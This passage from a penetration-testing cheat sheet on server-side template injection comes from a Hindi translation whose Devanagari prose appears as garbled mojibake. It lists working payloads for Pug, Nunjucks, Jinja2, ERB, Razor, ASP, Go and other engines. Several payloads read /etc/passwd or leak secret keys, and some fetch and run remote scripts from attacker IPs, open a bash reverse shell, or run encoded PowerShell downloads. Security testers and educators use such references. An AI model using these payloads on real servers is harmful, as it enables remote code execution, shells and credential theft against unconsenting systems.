**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**рдЙрджрд╛рд╣рд░рдг рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рд░реЗрдВрдбрд░**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = рддреНрд░реБрдЯрд┐
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = рддреНрд░реБрдЯрд┐`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Python рдореЗрдВ **рд╕рдиреНрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдирд┐рдпрдорд┐рдд рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЯреНрд░рд┐рдХреНрд╕ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = рддреНрд░реБрдЯрд┐`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

### Jinja2 (Python)

[рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ](http://jinja.pocoo.org)

> Jinja2 рдПрдХ рдкреВрд░реНрдг рд╕реБрд╡рд┐рдзрд╛рдУрдВ рд╡рд╛рд▓рд╛ рдкрд╛рдпрдерди рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рд╣реИред рдЗрд╕рдореЗрдВ рдкреВрд░реНрдг рдпреВрдирд┐рдХреЛрдб рд╕рдорд░реНрдерди, рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рдПрдХреАрдХреГрдд рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдирд┐рд╖реНрдкрд╛рджрди рд╡рд╛рддрд╛рд╡рд░рдг, рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ BSD рд▓рд╛рдЗрд╕реЗрдВрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

* `{{7*7}} = рддреНрд░реБрдЯрд┐`
* `${7*7} = ${7*7}`
* `{{foobar}} рдХреБрдЫ рдирд╣реАрдВ`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - рдЯреЗрдореНрдкрд▓реЗрдЯ рдкреНрд░рд╛рд░реВрдк**

Jinja2 рдПрдХ рдкрд╛рдпрдерди рдЖрдзрд╛рд░рд┐рдд рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рд╣реИ рдЬрд┐рд╕реЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдбрд╛рдпрдирд╛рдорд┐рдХ рдХрдВрдЯреЗрдВрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдкрд╛рд╡рд░рдлреБрд▓ рдФрд░ рд▓реЛрдХрдкреНрд░рд┐рдп рдЯреЗрдореНрдкрд▓реЗрдЯрд┐рдВрдЧ рдЗрдВрдЬрди рд╣реИ рдЬрд┐рд╕реЗ рдлреНрд▓рд╛рд╕реНрдХ, рдбрд┐рдЬрд╛рдВрдЧреЛ рдФрд░ рдЕрдиреНрдп рд╡реЗрдм рдлреНрд░реЗрдорд╡рд░реНрдХреНрд╕ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Jinja2 рдЯреЗрдореНрдкрд▓реЗрдЯ рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ, рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕, рдПрдХреНрд╕рдкреНрд░реЗрд╢рдиреНрд╕, рд▓реВрдкреНрд╕, рдХрдВрдбреАрд╢рдирд▓ рд▓реЙрдЬрд┐рдХ рдФрд░ рдлрдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЗрдирдкреБрдЯ рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдирдЬрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд░реЗрдВрдбрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдФрд░ рдПрдХреНрд╕рдкреНрд░реЗрд╢рдиреНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ, рд╣рдо рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди (SSTI) рдЯреЗрдХреНрдирд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╣реИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдПрдХ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд░ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдкрд░ рдЕрднрд┐рд╢рд╛рдкрд┐рдд рдХреЛрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЬрд┐рдирдЬрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде рдЦреЗрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдФрд░ рдПрдХреНрд╕рдкреНрд░реЗрд╢рдиреНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдирдЬрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реЛрдЧреАред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдо рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде рдЦреЗрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрднрд┐рд╢рд╛рдкрд┐рдд рдХреЛрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE рдЗрд╕рдХреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдирд╣реАрдВ**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinja рдХреЛ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= рд╕рдлрд▓рддрд╛`
* `@() <= рд╕рдлрд▓рддрд╛`
* `@("{{code}}") <= рд╕рдлрд▓рддрд╛`
* `@ <= рд╕рдлрд▓рддрд╛`
* `@{} <= рддреНрд░реБрдЯрд┐!`
* `@{ <= рддреНрд░реБрдЯрд┐!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NET `System.Diagnostics.Process.Start` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд░реНрд╡рд░ рдкрд░ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╢реБрд░реВ рдХрд░рдиреЗ рдФрд░ рдЗрд╕ рддрд░рд╣ рдПрдХ рд╡реЗрдмрд╢реЗрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЖрдк [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp) рдореЗрдВ рдПрдХ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╡реЗрдмрдРрдк рдЙрджрд╛рд╣рд░рдг рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = рдХреБрдЫ рдирд╣реАрдВ
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

рдпрд╣рд╛рдВ рдпрджреНрдпрдкрд┐ рдпрд╣ рдкрд░реНрд▓ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд░реВрдмреА рдореЗрдВ ERB рдХреА рддрд░рд╣ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

* `<%= 7*7 %> = 49`
* `<%= foobar %> = рддреНрд░реБрдЯрд┐`
```
<%= perl code %>
<% perl code %>
```
### GO рдореЗрдВ SSTI

рдмреИрдХрдПрдВрдб рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрди payloads рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* `{{ . }}` = рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛
* рдпрджрд┐ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдореЗрдВ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ рдкрд┐рдЫрд▓рд╛ payload рдЗрд╕реЗ рд▓реАрдХ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕реЗ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `{{ .Password }}`
* `{{printf "%s" "ssti" }}` = рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢рдмреНрдж ssti рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП
* `{{html "ssti"}}`, `{{js "ssti"}}` = рдпреЗ рдХреБрдЫ рдЕрдиреНрдп payloads рд╣реИрдВ рдЬреЛ рд╢рдмреНрдж "ssti" рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХрд░реЗрдВрдЧреЗ рдмрд┐рдирд╛ "js" рдпрд╛ "html" рдХреЗ рдЕрдВрддрд┐рдо рд╢рдмреНрджреЛрдВ рдХреЗред рдЖрдк рдЗрдВрдЬрди рдореЗрдВ рдЕрдзрд┐рдХ рдХреАрд╡рд░реНрдбреНрд╕ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ [here](https://golang.org/pkg/text/template).

**XSS рд╢реЛрд╖рдг**

рдпрджрд┐ рд╕рд░реНрд╡рд░ **text/template** рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ XSS рдХреЛ рд╕рд░рд▓рддрд╛ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ **рдмрд╕** рдЕрдкрдиреЗ **payload** рдХреЛ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд░рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ **html/template** рдХреЗ рд╕рд╛рде рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрддреНрддрд░ рдХреЛ HTML рдХреЛрдб рдореЗрдВ рдПрдирдХреЛрдб рдХрд░рддрд╛ рд╣реИ: `{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

рд╣рд╛рд▓рд╛рдВрдХрд┐, Go рдХреЛ **рдкреВрд░рд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ** рдФрд░ рдлрд┐рд░ рдмрд╛рдж рдореЗрдВ рдЗрд╕реЗ **рдХреЙрд▓ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред Payload рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╣реЛрдЧрд╛:\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**RCE рд╢реЛрд╖рдг**

html/template рдореЙрдбреНрдпреВрд▓ рдХреЗ рд▓рд┐рдП рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг [рдпрд╣рд╛рдВ](https://golang.org/pkg/html/template/) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ text/template рдореЙрдбреНрдпреВрд▓ рдХреЗ рд▓рд┐рдП рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг [рдпрд╣рд╛рдВ](https://golang.org/pkg/text/template/) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рд╣рд╛рдБ, рд╡реЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЕрд▓рдЧ рд╣реЛрддреЗ рд╣реИрдВ, рдмрд╣реБрддред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **text/template** рдореЗрдВ, рдЖрдк "рдХреЙрд▓" рдорд╛рди рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрдзреЗ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ html/template рдХреЗ рд╕рд╛рде рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИред

рдпрджрд┐ рдЖрдк GO рдореЗрдВ SSTI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдЦреЛрдЬрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЬреИрд╕реЗ рд╣реА рдЖрдк `{{ . }}` рдХреЗ рд╕рд╛рде рджрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдЙрд╕рдХреЗ **рдореЗрдердбреНрд╕ рдХреЛ рдХреЙрд▓** рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рд╕реЛрдЪреЗрдВ рдХрд┐ **рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ System** рдирд╛рдордХ рдПрдХ рдореЗрдердб рд╣реИ рдЬреЛ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдЗрд╕реЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `{{ .System "ls" }}`\
рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рд╢рд╛рдпрдж **рд╕реНрд░реЛрдд рдХреЛрдб** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдРрд╕реЗ рдХреБрдЫ рдХреЛрдб рдХрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрд░реЛрдд рдХреЛрдб рдЗрд╕ рддрд░рд╣ рд╣реЛрдЧрд╛:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### рдЕрдзрд┐рдХ рд╢реЛрдз

рдЕрдзрд┐рдХ рд╢реЛрдз рдХреЗ рд▓рд┐рдП [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) рджреЗрдЦреЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI) рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЯреИрдЧ рд╕реВрдЪрдирд╛ рднреА рдорд┐рд▓реЗрдЧреАред

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## рд╕рдВрдмрдВрдзрд┐рдд рд╕рд╣рд╛рдпрддрд╛

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдкрдврд╝реЗрдВ:

* [Flask tricks](../../network-services-pentesting/pentesting-web/flask.md)
* [Python magic functions](broken-reference/)

## рдЙрдкрдХрд░рдг

{% embed url="https://github.com/epinna/tplmap" %}

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реВрдЪреА

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## рдЕрднреНрдпрд╛рд╕ рдФрд░ рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдореНрдореЗрд▓рди рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

